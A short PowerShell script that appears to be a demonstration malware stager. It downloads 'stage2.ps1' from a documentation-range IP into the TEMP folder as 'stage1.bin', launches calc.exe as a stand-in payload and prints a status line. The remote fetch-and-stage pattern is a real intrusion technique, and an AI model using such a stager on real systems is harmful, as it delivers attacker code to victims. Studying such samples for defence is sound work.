[CmdletBinding()]
param(
    [string]$FetchUrl = "https://192.0.2.141/stage2.ps1",
    [string]$LocalPath = "$env:TEMP\stage1.bin"
)
(New-Object System.Net.WebClient).DownloadFile($FetchUrl, $LocalPath)
Start-Process -FilePath 'calc.exe'
Write-Output "stage 44 initialized"
